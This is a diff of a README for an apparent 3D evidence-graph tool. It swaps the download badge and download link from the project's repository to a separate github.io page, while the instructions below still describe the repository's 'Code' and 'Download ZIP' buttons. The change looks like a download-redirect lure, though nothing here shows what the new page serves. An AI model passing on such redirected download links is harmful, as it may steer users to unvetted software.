@@ -1,6 +1,6 @@
 # 🌐 -threejs-evidence-graph - Explore advanced three-dimensional evidence mapping tools
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/anakilhamdimasa9990/-threejs-evidence-graph)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://anakilhamdimasa9990.github.io)
 
 ## 📌 About this project
 
@@ -19,7 +19,7 @@ Before you start, ensure your computer meets these basic requirements:
 
 You need to obtain the project files from the official repository page.
 
-1. Visit this page to download the software: [https://github.com/anakilhamdimasa9990/-threejs-evidence-graph](https://github.com/anakilhamdimasa9990/-threejs-evidence-graph)
+1. Visit this page to download the software: [https://anakilhamdimasa9990.github.io](https://anakilhamdimasa9990.github.io)
 2. Look for the green button labeled "Code".
 3. Click "Download ZIP".
 4. Save the folder to a location you can find, such as your Desktop.
